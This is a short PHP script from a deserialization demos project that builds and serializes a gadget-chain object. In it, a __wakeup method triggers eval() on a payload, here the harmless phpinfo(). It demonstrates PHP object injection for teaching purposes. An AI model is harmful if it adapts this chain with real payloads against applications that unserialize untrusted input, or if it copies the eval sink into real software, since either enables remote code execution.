#!/usr/bin/env php
<?php
/* Creates gadget chain exploit to STDOUT or file.
   Note that the class definition can be found within this file.

   SPDX-License-Identifier: GPL-3.0-or-later

   This file is part of the deserialization demos:
   https://github.com/PeterMosmans/deserialization-demos
 */

$object = new Initial();
$secondary = new Secondary();
$secondary->payload = "phpinfo();";
$object->secondary = $secondary;
$serialized = serialize($object);

if ($argc < 2) {
    /* Write to STDOUT */
    print $serialized;
} else {
    /* Write to file */
    $filename = $argv[1];
    file_put_contents($filename, $serialized);
    print "Object serialized and saved to " . $filename . "\n";
}

class Initial
{
    public $secondary;
    function __wakeup()
    {
        return $this->secondary->sink();
    }
}
class Secondary
{
    public $payload;
    function sink()
    {
        eval($this->payload);
    }
}


?>
